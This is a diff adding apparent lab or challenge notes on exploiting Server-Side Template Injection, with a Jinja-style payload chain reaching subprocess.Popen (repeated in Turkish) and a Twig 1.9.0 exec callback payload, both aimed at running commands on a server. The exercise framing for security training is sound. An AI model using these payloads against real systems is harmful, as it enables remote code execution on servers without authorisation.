@@ -1,0 +1,49 @@
+SSTI 01
+
+Server-Side Template Injection (SSTI) vulnerabilities arise when user inputs are concatenated into templates on the server side, leading to potential execution of arbitrary code. In this particular exercise inspired by the HackerOne report, the SSTI vulnerability was found in the 404 error management of a web application. Here's a step-by-step approach to exploit this vulnerability:
+
+Testing for SSTI:
+
+Input {{'7'*7}} into the template. If the result 7777777 is returned, SSTI is confirmed.
+Finding Exploitable Classes:
+
+Use {{''.__class__.mro()[1].__subclasses__()}} to get a list of all subclasses.
+You may need to adjust the index to find a list of useful functions or classes. For example, {{''.__class__.mro()[1].__subclasses__()[X]}} where X is the index of an interesting class.
+Gaining Code Execution:
+
+Identify the subprocess.Popen class which allows command execution. This can be done by iterating through the subclasses and checking their names.
+Once identified, use: {{''.__class__.mro()[1].__subclasses__()[X]('id')}} where X is the index of subprocess.Popen.
+Executing Commands:
+
+Replace 'id' with any command you want to execute on the server.
+Detailed Example in Turkish:
+Bu alıştırma, HackerOne raporundan ilham alınarak hazırlanmıştır. Bu alıştırmada, hata 404 hata yönetiminde bulunuyor. İşte adım adım nasıl istismar edebileceğiniz:
+
+SSTI Testi:
+
+{{'7'*7}} girdisini şablona ekleyin. Sonuç 7777777 dönerse, SSTI doğrulanmıştır.
+İstismar Edilebilir Sınıfların Bulunması:
+
+{{''.__class__.mro()[1].__subclasses__()}} kullanarak tüm alt sınıfların listesini alın.
+Kullanışlı fonksiyonlar veya sınıfları bulmak için indeksi ayarlamanız gerekebilir. Örneğin, {{''.__class__.mro()[1].__subclasses__()[X]}} burada X ilginç bir sınıfın indeksidir.
+Kod Yürütme Kazanma:
+
+Komut yürütme sağlayan subprocess.Popen sınıfını belirleyin. Bu, alt sınıfları iterasyonla ve adlarını kontrol ederek yapılabilir.
+Belirlendikten sonra, şunu kullanın: {{''.__class__.mro()[1].__subclasses__()[X]('id')}} burada X subprocess.Popen indeksidir.
+Komutların Yürütülmesi:
+
+'id' yerine sunucuda çalıştırmak istediğiniz herhangi bir komutu koyun.
+
+This approach allows you to carefully exploit the SSTI vulnerability and gain code execution on the server. For more detailed information, please refer to the HackerOne report. (https://hackerone.com/reports/125980)
+
+
+
+SSTI 02
+
+This challenge covers the exploitation of a Server Side Template Injection in an old version of Twig (1.9.0).
+This issue can be used to gain code execution on the server. To get code execution you need to find a way to execute command using the functions offered by the template. Fortunately, the following code can be used:
+
+{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
+
+Using this code, you should be able to score this exercise.
+
